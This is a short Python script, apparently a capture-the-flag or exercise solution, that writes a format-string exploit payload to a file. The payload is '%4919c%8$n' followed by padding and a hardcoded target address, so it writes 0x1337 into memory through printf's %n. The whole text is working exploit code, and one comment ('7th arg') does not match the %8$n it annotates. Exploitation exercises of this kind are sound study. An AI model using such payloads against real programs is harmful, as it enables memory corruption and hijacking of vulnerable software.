with open("./payload", "w") as f:
    # f.write(b'\xff'*8)

    f.write("%4919c%8$n") # 7th arg from printf

    f.write('A'*6) # pad last 4 bytes of first "word"
    f.write('\x1c\x50\x75\x55\x55\x55\x00\x00') # sample address